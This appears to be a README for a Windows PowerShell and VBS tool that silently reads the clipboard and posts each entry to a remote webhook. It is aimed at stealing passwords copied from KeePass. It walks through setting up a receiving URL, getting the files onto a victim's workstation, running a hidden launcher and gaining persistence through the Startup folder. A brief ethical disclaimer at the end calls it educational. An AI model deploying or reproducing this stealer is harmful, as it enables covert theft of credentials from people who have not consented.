# 🧪 GiveMeYourClipBoard

## 🕵️‍♂️ Cybersecurity: KeePass Clipboard Agent Leak

**GiveMeYourClipBoard** is a lightweight project that streams the contents of a Windows machine’s clipboard to a remote server.  
Imagine you're conducting a **pentest** and want to retrieve sensitive data temporarily stored in memory — such as **passwords copied from KeePass**.

---

## ⚙️ How It Works

- 🔍 Continuously scans the Windows clipboard
- 📤 Sends each new clipboard entry via **HTTP POST** to a URL of your choice
- 🔄 Runs silently in the background (default: every 2 seconds)
- ⚙️ Simple to configure with a `.txt` file
- 🫥 And most importantly: **completely invisible to the user**

---

## 🗂️ Project Structure

```
📁 GiveMeYourClipBoard/
├── yourhttp_server.txt       <- contains your server/webhook URL
├── givemeyourclipboard.ps1   <- standalone PowerShell script
└── RUN.vbs                   <- stealth launcher (no window shown)
```

---

## 🚀 Let's Go

### 1. Set up a webhook server

Start a server or use a free webhook service to receive incoming POST requests.  
For example, head over to [https://webhook.site](https://webhook.site) — it will instantly generate a **unique URL** for you.
![image](https://github.com/user-attachments/assets/dc40c327-0ec0-4f1a-85df-3ebb7f31e0f0)

I will use this URL and copy it into the project's yourhttp_server.txt file
![image](https://github.com/user-attachments/assets/5a4aac05-c3da-4e6a-b32e-0d4c4b8458bc)
Your project is ready, now find a vector to copy the project to the victim's workstation(s).

2. On the victim's workstation, launch RUN.VBS (double-click).
3. Back at your headquarters, monitor the activity on your server interface.
4. During the day, your user will likely copy and paste credentials into memory, which you can retrieve live.

Example with KeePass
![image](https://github.com/user-attachments/assets/0653659d-7952-4948-aadd-07adc0c67ab9)
get the result !
![image](https://github.com/user-attachments/assets/5e47b1d2-1d49-44d1-8913-68ce8964fe8c)


To go further, you can launch everything automatically when Windows starts:
Place a shortcut to the .vbs file in:
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

You now have a persistent, silent agent that posts the clipboard to a remote server.

🔐 Ethical Warning
This type of script has the potential for malicious use. This project is strictly educational.
Any clipboard monitoring must be done with the user's explicit consent, within a legal and ethical framework (e.g., internal testing, training, lab environment, etc.).
